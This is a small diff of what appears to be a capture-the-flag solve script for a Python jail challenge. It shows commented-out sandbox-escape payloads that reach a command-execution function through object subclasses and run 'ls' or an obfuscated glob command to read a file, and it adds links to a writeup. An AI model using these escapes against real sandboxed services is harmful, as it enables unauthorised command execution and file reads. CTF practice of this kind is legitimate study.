@@ -33,3 +33,9 @@ solve()
 # print([*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][-5]("{} ./????.???".format(().__doc__[-3] + ().__doc__[-11] + ().__doc__[-2])).read())
 
 # print([*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][-5]("ls").read())
+
+"""
+https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross
+https://lingojam.com/ItalicTextGenerator
+
+"""
